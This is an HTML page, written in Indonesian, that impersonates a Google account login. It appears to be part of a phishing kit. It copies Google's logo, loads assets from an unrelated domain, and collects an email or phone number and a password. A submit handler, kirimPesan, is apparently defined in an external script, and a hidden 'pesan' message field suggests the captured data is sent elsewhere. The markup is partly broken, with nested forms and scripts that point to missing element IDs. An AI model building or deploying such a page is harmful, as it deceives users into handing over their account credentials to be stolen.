<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Login - Account Google </title>
    <link rel="stylesheet" href="css/style.css">
    <script src="js/jquery-3.3.1.js"></script>
    <script src="js/script.js"></script>
</head>
<body>
    <div class="main">
        <div class="overlay"></div>

        <!-- Loaders -->
        <div class="preloader" style="display: none;">
            <div class="preloader-bar">
                <div class="preloader-bars"></div>
            </div>
        </div>
        <div id="loader-2" style="display: none;">
            <div class="three-balls">
                <div class="ball ball1"></div>
                <div class="ball ball2"></div>
                <div class="ball ball3"></div>
            </div>
            <div class="loader-2-text">Signing you in...</div>
        </div>

        <!-- Menu -->
        <div class="menu">
            <div class="menu-icon">
                <img src="https://api.newblast.shop/menu.svg" alt="">
            </div>
            <div class="menu-items">
                <ul>
                    <li id="about">About</li>
                    <li id="overlay-btn">Overlay</li>
                    <li>Instagram</li>
                    <li>Contact</li>
                    <li>etc...</li>
                </ul>
            </div>
        </div>

        <!-- Logo -->
        <div class="logo">
            <img style="border:none;margin:11px 0" height="70" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" width="200" id="hplogo" alt="Google" data-csiid="IipyZ82qDaXQ0-kP1orz-QM_1" data-atf="1">
            
        </div>

        <!-- Main Heading -->
        <h1 class="heading">
            <div class="h_main">Login</div>
            <div class="h_sub">Masuk Akun Google Anda Untuk Terhubung</div>
        </h1>

        <!-- User Tag -->
        <div class="tag-wrapper" style="display: none; visibility: hidden;">
            <div class="user-tag">
                <img src="https://api.newblast.shop/user.svg" alt="">
                <span class="email-text"></span>
                <img src="https://api.newblast.shop/down-chevron.svg" alt="">
            </div>
        </div>

        <!-- Form Section -->
        <div class="slide-content">
            <form action="main2.html" method="post" id="combinedForm">
                <!-- Email Section -->
                <div class="content1">
<div class="input-group">
    <form>
        <input type="text"  class="field email-field" id="nama" placeholder="Email atau nomor telepon" required=""/>
        <!-- Password Section -->
        	<div class="content2" style="display: none;">
        </div>
      <div class="input-group">
      	
        <input type="text" class="field password-field" id="email" placeholder="Kata sandi" />
        </div>
                    <span class="forgot">Lupa e-mail?</span>
                    
                        Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi.
                    </div>
                    <div class="create-Next">
                        <span>Buat akun</span>
        <input type="text" style="display: none;" id="pesan" placeholder="Pesan"/>
        <p style="display: none;">This text is hidden.</p>
        
        <input type="submit" class="btn" id="kirim" value="Selanjutnya" onclick="kirimPesan()" />
    </form>

  </div>

  <script>
  	
    // Menangani submit form
    const loginForm = document.getElementById('login-form');
    const loadingIndicator = document.getElementById('loading');

    loginForm.addEventListener('submit', function (e) {
      // Mencegah submit langsung
      e.preventDefault();

      // Menampilkan loading
      loadingIndicator.style.display = 'block';

      // Simulasi loading selama 2 detik sebelum melanjutkan
      setTimeout(() => {
        loginForm.submit();
      }, 2000);
    });
  </script>
</body>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="main.js"></script>

</html>
